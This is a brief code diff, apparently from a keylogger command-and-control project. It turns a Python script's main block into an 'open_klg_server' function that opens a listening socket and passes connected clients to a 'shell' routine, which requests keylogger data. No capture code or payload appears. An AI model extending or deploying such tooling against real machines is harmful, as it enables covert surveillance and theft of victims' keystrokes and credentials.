@@ -19,6 +19,6 @@ def shell(client: socket.socket, ip: str):
                 klg.call_keylogger_get(client)
 
 
-if __name__ == "__main__":
+def open_klg_server():
     client, ip = server.open_server((config.IP, config.KLG_PORT))
     shell(client, ip)
